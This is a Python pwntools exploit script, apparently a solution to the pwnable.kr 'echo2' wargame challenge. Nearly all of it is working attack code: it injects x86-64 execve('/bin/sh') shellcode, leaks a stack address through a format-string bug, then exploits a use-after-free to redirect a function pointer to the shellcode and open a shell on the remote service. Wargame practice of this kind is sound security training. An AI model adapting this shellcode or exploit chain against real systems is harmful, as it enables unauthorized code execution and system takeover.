#!/usr/bin/env python3
from pwn import *

elf = ELF("./echo2")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "pwnable.kr"
port = 9011

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
        # you need r.interactive() !
    else:
        return process([elf.path])
r = start()

# rop = ROP(elf)
# rop = ROP(elf, libc)
# rop = ROP(elf, libc, ld)

#========= exploit here ===================
# http://shell-storm.org/shellcode/files/shellcode-909.html
sc = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54" \
     b"\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05"

# Put shellcode
r.sendlineafter(b":",sc)

# Leak a stack address (FSB echo)
r.sendlineafter(b">",b"2")
r.sendlineafter(b"\n",b"%10$p")
sc_address = int(r.recvline().strip(),16) - 0x20
r.info("Shellcode address: " +  hex(sc_address))

# Free o
r.sendlineafter(b">",b"4")
r.sendlineafter(b"(y/n)",b"n")

# Overwrite o[3] -> greetings (UAF echo)
r.sendlineafter(b">",b"3")
r.sendlineafter(b"\n",b"A"*24 + p64(sc_address))

# Shell
r.sendline(b"1")
r.interactive()
